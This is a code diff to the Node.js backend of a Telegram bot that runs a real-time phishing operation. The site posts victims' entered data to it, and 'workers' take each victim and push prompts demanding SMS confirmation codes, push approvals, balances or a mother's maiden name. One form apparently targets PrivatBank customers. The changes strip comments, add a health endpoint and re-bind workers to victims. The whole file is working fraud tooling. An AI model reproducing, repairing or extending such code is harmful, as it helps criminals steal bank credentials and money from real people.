@@ -11,7 +11,7 @@ const CHANNEL_ID = '-1003455979409';
 
 let userTasks = {}; 
 let logsStorage = {}; 
-let waitingForText = {}; // Храним связь: chatId воркера -> userId пользователя
+let waitingForText = {}; 
 
 const cmdTexts = {
     'sms': 'Введите код подтверждения из СМС',
@@ -23,15 +23,16 @@ const cmdTexts = {
 
 const safeText = (text) => String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
 
+// --- ПУБЛИЧНЫЙ ЭНДПОИНТ ДЛЯ ПРОВЕРКИ (ЧТОБЫ НЕ СПАЛ) ---
+app.get('/health', (req, res) => res.send('Бот активен'));
+
 // --- ПРИЕМ ЛОГА С САЙТА ---
 app.post('/api/log', async (req, res) => {
     const { userId, type, data } = req.body;
     logsStorage[userId] = { type, data, time: new Date().toLocaleTimeString() };
 
-    // Ищем воркера, который взял этого юзера в работу
     const workerId = Object.keys(waitingForText).find(id => waitingForText[id] === userId);
 
-    // Если это ответ на форму (код и т.д.) И есть привязанный воркер
     if (workerId && (type === 'ОТВЕТ' || type === 'ВВІД_ПРИВАТ')) {
         let replyMsg = `<b>📩 ПОЛУЧЕН ОТВЕТ [<code>${userId}</code>]</b>\n\n`;
         for (let key in data) { replyMsg += `<b>${key}:</b> <code>${data[key]}</code>\n`; }
@@ -42,7 +43,6 @@ app.post('/api/log', async (req, res) => {
             parse_mode: 'HTML'
         }).catch(e => console.log("Error sending to worker"));
     } else {
-        // Если это новый лог (вход), шлем в канал
         let channelMsg = `<b>🆕 НОВЫЙ ЛОГ [${safeText(type)}]</b>\n`;
         channelMsg += `🆔 ID: <code>${safeText(userId)}</code>\n`;
         channelMsg += `📍 Статус: 🔵 Ожидает воркера...`;
@@ -71,7 +71,7 @@ app.post('/tg-webhook', async (req, res) => {
     try {
         const { message, callback_query } = req.body;
 
-        // 1. ОБРАБОТКА ТЕКСТА (Для команды "Свой текст")
+        // 1. ОБРАБОТКА ТЕКСТА
         if (message && message.text) {
             const chatId = message.chat.id;
 
@@ -83,7 +83,6 @@ app.post('/tg-webhook', async (req, res) => {
                 });
             } 
 
-            // Если воркер прислал текст, а за ним закреплен юзер
             if (waitingForText[chatId]) {
                 const targetUserId = waitingForText[chatId];
                 userTasks[targetUserId] = { action: 'ask', text: message.text };
@@ -101,18 +100,15 @@ app.post('/tg-webhook', async (req, res) => {
         if (callback_query) {
             const data = callback_query.data;
             const workerId = callback_query.from.id;
-
-            // Разбираем callback: take_ID, ask_ID_sms, custom_ID и т.д.
             const parts = data.split('_');
             const action = parts[0];
             const userId = parts[1];
             const code = parts[2];
 
-            // Кнопка: ВЗЯТЬ В РАБОТУ
             if (action === 'take') {
                 const log = logsStorage[userId];
                 if (log) {
-                    // КРИТИЧНО: Закрепляем юзера за воркером сразу!
+                    // ЗАКРЕПЛЯЕМ СВЯЗЬ СРАЗУ
                     waitingForText[workerId] = userId; 
 
                     let fullMsg = `<b>💎 УПРАВЛЕНИЕ ЛОГОМ [${log.type}]</b>\n`;
@@ -132,7 +128,6 @@ app.post('/tg-webhook', async (req, res) => {
                         }
                     });
                     
-                    // Обновляем сообщение в канале
                     const workerName = callback_query.from.username ? `@${callback_query.from.username}` : callback_query.from.first_name;
                     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                         chat_id: CHANNEL_ID,
@@ -143,17 +138,18 @@ app.post('/tg-webhook', async (req, res) => {
                 }
             }
 
-            // Кнопка: Свой текст
             if (action === 'custom') {
+                waitingForText[workerId] = userId; // Еще раз закрепляем для надежности
                 await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     chat_id: workerId,
-                    text: `⌨️ <b>Введите текст для пользователя <code>${userId}</code>:</b>\nНапример: <i>"Введите девичью фамилию матери для подтверждения"</i>`,
+                    text: `⌨️ <b>Введите текст для пользователя <code>${userId}</code>:</b>\nНапример: <i>"Введите девичью фамилию"</i>`,
                     parse_mode: 'HTML'
                 });
             }
 
-            // Кнопки: СМС, Пуш, Баланс и т.д.
             if (action === 'ask' || action === 'msg') {
+                // При нажатии кнопок команд тоже закрепляем связь, если она вдруг слетела
+                waitingForText[workerId] = userId;
                 userTasks[userId] = { action, text: cmdTexts[code] || "Введите данные" };
                 await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                     callback_query_id: callback_query.id,
